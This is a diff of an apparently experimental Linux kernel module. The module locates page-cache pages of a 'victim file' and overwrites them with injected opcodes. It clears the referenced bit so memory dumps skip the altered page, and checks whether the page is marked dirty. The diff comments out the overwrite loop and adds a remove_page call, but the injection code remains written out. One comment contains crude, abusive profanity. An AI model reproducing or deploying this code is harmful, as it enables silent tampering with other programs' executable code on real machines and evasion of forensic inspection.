@@ -20,10 +20,12 @@ char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x5C, 0xBE, 0x08, 0x00, 0x90, 0x90
 int init_module(void)
 {
  	void* map;
+  void* new_page_kernel;
+  void* new_page_user;
   char* ptr;
   struct page* page;
   int count;
-  char* path = TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);///VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);
+  char* path = VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);///VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);
 //  printk("path after stringify %d\n", linux); //stupid fucking macro nobody like you you cuck fuck you
 	struct inode* i = get_file_path(path);//
   if(!i){
@@ -32,18 +34,14 @@ int init_module(void)
   }
   printk(KERN_INFO "Path Succeeded\n");
 
-
+  //new_page_kernel = alloc_page(GFP_KERNEL);
+  //new_page_user = alloc_page(GFP_USER)
 
   if(i -> i_mapping == NULL){
-    printk(KERN_INFO "This page does not have an address_space object\n");
+    printk(KERN_INFO "This page does not have an address_space object - it is likely not part of the page cache\n");
     return 0;
   }
-  printk(KERN_INFO "This page has an address_space object\n");
-  page = find_page_inode(i, 0);
-  if(!page){
-    printk(KERN_INFO "Page failed\n");
-    return 0;
-  }
+  printk(KERN_INFO "This page has an address_space object - it is likely not part of the page cache\n");
   /*
   page = find_page_inode(i, 0);
   if(!page){
@@ -63,7 +61,8 @@ int init_module(void)
   */
 
 
-  page = find_page_inode(i, 0x0019d030); //ok so this actually works
+  /*page = find_page_inode(i, 0x0019d030); //ok so this actually works
+  printk("%lu\n", page->flags);
   if(!page){
     printk(KERN_INFO "Page failed\n");
     return 0;
@@ -76,6 +75,7 @@ int init_module(void)
   kunmap(map);
   ClearPageReferenced(page); //the page dump won't dump referenced pages so clear the bit
   page = find_page_inode(i, 0x001111d4);
+
   if(!page){
     printk(KERN_INFO "Page failed\n");
     return 0;
@@ -86,8 +86,13 @@ int init_module(void)
     *ptr = trolling_opcodes[count];
   }
   kunmap(map);
+  printk("%lu\n", page->flags);
+  */
+  page = remove_page(i, 0x001111d4);
 
-  //SetPageDirty(page); //this fixes it thus proving that it is not a bug in the writeback daemon
+  if(!page){
+    return 0; //don't continue into flag checking if we haven't initalized a page
+  }
 
   if(PageDirty(page)){
     printk(KERN_INFO "Its Dirty!\n");
